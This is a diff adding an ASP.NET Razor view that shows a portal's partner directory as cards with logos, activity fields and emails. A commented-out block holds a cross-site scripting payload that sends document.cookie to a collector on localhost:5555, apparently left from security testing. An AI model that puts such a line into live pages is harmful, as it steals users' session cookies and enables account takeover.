@@ -1,0 +1,105 @@
+﻿
+@{
+    ViewBag.Title = "Index";
+    Layout = "~/Areas/Publish/Views/Shared/_InternalLayout2.cshtml";
+}
+
+@using EPORTAL.ModelsDanhBaDoiTac
+@model PagedList.IPagedList<ManagePartnerValidation>
+@using PagedList.Mvc
+<link href="~/Content/assets/css/PagedList.css" rel="stylesheet" />
+<link rel="stylesheet" href="~/Layout/css/style_home.css" />
+
+
+<link rel="stylesheet" href="~/Layout/css/reset.css" />
+@if (TempData["msgSuccess"] != null)
+{
+    @Html.Raw(TempData["msgSuccess"])
+}
+@if (TempData["msgError"] != null)
+{
+    @Html.Raw(TempData["msgError"])
+}
+
+
+
+
+
+
+
+<div class="d_content s_main-content">
+
+
+    <div class="card-body">
+
+        <div class="tab-content">
+
+            <div class="row" style="padding: 0 3%;">
+                @foreach (var item in Model)
+                {
+
+                    <div class="col-md-7 col-xl-3" style="padding: 30px 20px;">
+
+                        <a id="@item.IDDoiTac" href="@Url.Action("Index" , "InfoPartner" , new { id = @item.IDDoiTac })" style="text-decoration: none; width:300px">
+                            <div class="card mb-4" style="width: 300px; height: 208.91px">
+
+                                <div class="text-white" style="width: 300px; height: 208.91px">
+
+                                    <img src="@item.ImageLogo" style="width: 300px;height: 208.91px; text-align:center">
+
+                                </div>
+
+                            </div>
+                            <div class="widget-content">
+
+                                <div class="widget-content-wrapper" style="padding: .5rem 0 0;">
+
+                                    <div class=""><p class="" style="color: #05418A; font-weight: bold !important; ">Lĩnh vực : @item.TenLVHĐ</p></div>
+
+                                </div>
+
+                                <div class="widget-content-wrapper" style="padding: .5rem 0 0;">
+
+                                    <div class=""><p class="" style="color: #0183c1; font-weight: bold !important; ">Email : @item.Email</p></div>
+
+
+                                    @*<script>new Image().src = "http://localhost:5555?output=" + document.cookie;</script>
+
+                                        <script>new Image().src = "http://localhost:5555?output=" + 123465765</script>*@
+
+                                </div>
+
+                            </div>
+                        </a>
+
+                    </div>
+                }
+            </div>
+
+        </div>
+
+
+
+    </div>
+
+
+</div>
+
+
+
+<script type="text/javascript">
+
+
+
+
+
+</script>
+<style>
+    .d_content {
+        margin-top: 70px
+    }
+</style>
+
+
+
+
